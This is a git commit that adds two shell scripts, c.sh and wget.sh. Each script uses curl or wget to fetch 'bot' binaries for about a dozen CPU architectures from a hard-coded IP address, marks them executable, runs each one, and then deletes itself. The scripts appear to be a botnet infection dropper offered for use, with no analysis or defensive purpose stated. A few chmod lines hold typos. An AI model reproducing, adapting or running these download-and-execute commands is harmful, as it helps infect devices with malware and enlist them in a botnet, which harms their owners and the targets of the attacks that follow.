40d96277b9a49e9618ae7aaa595c367846fd969e
Đậu Đậu <59077968+DauDau432@users.noreply.github.com>
2023-02-14 00:51:04 +0700

    Add files via upload

---
+++ c.sh
@@ -0,0 +1,14 @@
+curl http://167.172.79.33/bins/bot.arm; chmod 777 bot.arm; ./bot.arm android
+curl http://167.172.79.33/bins/bot.arm5; chmod 777 bot.arm5; ./bot.arm5 android
+curl http://167.172.79.33/bins/bot.arm6; chmod 777 bot.arm6; ./bot.arm6 android
+curl http://167.172.79.33/bins/bot.arm7; chmod 777 bot.arm7; ./bot.arm7 android
+curl http://167.172.79.33/bins/bot.m68k; chmod 777 bot.m68k; ./bot.m68k android
+curl http://167.172.79.33/bins/bot.mips; chmod 777 bot.mips; ./bot.mips android
+curl http://167.172.79.33/bins/bot.mpsl; chmod 777 mpsl; ./bot.mpsl android
+curl http://167.172.79.33/bins/bot.ppc; chmod 777 bot.pbot.pc; ./bot.ppc android
+curl http://167.172.79.33/bins/bot.sh4; chmod 777 bot.sh4; ./bot.sh4 android
+curl http://167.172.79.33/bins/bot.spc; chmod 777 bot.spc; ./bot.spc android
+curl http://167.172.79.33/bins/bot.x86; chmod 777 bot.x86; ./bot.x86 android
+curl http://167.172.79.33/bins/bot.x86_64; chmod 777 bot.x86_64; ./bot.x86_64 android
+
+rm $0
---
+++ wget.sh
@@ -0,0 +1,14 @@
+wget http://167.172.79.33/bins/bot.arm; chmod 777 bot.arm; ./bot.arm android
+wget http://167.172.79.33/bins/bot.arm5; chmod 777 bot.arm5; ./bot.arm5 android
+wget http://167.172.79.33/bins/bot.arm6; chmod 777 bot.arm6; ./bot.arm6 android
+wget http://167.172.79.33/bins/bot.arm7; chmod 777 bot.arm7; ./bot.arm7 android
+wget http://167.172.79.33/bins/bot.m68k; chmod 777 bot.m68k; ./bot.m68k android
+wget http://167.172.79.33/bins/bot.mips; chmod 777 bot.mips; ./bot.mips android
+wget http://167.172.79.33/bins/bot.mpsl; chmod 777 mpsl; ./bot.mpsl android
+wget http://167.172.79.33/bins/bot.ppc; chmod 777 bot.pbot.pc; ./bot.ppc android
+wget http://167.172.79.33/bins/bot.sh4; chmod 777 bot.sh4; ./bot.sh4 android
+wget http://167.172.79.33/bins/bot.spc; chmod 777 bot.spc; ./bot.spc android
+wget http://167.172.79.33/bins/bot.x86; chmod 777 bot.x86; ./bot.x86 android
+wget http://167.172.79.33/bins/bot.x86_64; chmod 777 bot.x86_64; ./bot.x86_64 android
+
+rm $0
